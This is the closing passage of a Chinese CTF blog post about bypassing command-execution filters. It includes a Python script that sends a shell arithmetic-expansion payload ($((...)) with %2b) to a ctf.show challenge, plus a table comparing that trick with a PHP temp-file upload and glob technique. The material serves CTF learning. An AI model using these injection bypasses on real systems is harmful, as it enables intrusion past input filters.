+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">base = <span class="string">&#x27;https://xxx.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line">three = <span class="string">&#x27;$((!$((%20))%2b!$((%20))%2b!$((%20))))&#x27;</span></span><br><span class="line">six   = <span class="string">&#x27;$((!$((%20))%2b!$((%20))%2b!$((%20))%2b!$((%20))%2b!$((%20))%2b!$((%20))))&#x27;</span></span><br><span class="line">c = three + six</span><br><span class="line"></span><br><span class="line">url = base + <span class="string">&#x27;?c=&#x27;</span> + c</span><br><span class="line">r = requests.get(url, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="两种思路对比"><a href="#两种思路对比" class="headerlink" title="两种思路对比"></a>两种思路对比</h3><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>web56（文件上传）</th>
+<th>flag in 36.php（算术展开）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>绕过方式</strong></td>
+<td>PHP 文件上传 → 临时文件 → source 执行</td>
+<td>Shell 算术展开 <code>$((...))</code> 构造数字</td>
+</tr>
+<tr>
+<td><strong>关键允许字符</strong></td>
+<td>几乎全封</td>
+<td><code>$</code> <code>(</code> <code>)</code> <code>!</code> <code>+</code></td>
+</tr>
+<tr>
+<td><strong>请求方式</strong></td>
+<td>POST（必须上传文件）</td>
+<td>GET</td>
+</tr>
+<tr>
+<td><strong>核心技巧</strong></td>
+<td>glob 通配符匹配 <code>/tmp/phpXXXXXX</code></td>
+<td><code>$((...))</code> 算术展开 + <code>%2b</code> 绕过加号</td>
+</tr>
+<tr>
+<td><strong>原理本质</strong></td>
+<td>利用 PHP 自身机制（文件上传）</td>
+<td>利用 Shell 自身机制（算术展开）</td>
+</tr>
+</tbody></table>
+<p><strong>核心心法：</strong> 不要只想着”绕过过滤”，要思考”我还能用什么”。当字母和数字都被封了，Shell 本身的功能（算术展开、通配符、变量展开）可能就是你需要的新工具。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>John Doe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://cai-cai-jun.github.io/2026/09/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%A4%A7%E5%85%A8/">https://cai-cai-jun.github.io/2026/09/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%A4%A7%E5%85%A8/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/"># Web安全</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"># 命令执行</a>
+                    
+                        <a href="/tags/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"># 绕过技巧</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2026/09/06/eval%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/">eval() 注入速查表</a>
+            
+            
+            <a class="next" rel="next" href="/2026/08/17/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">PHP伪协议从入门到入坟</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© John Doe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
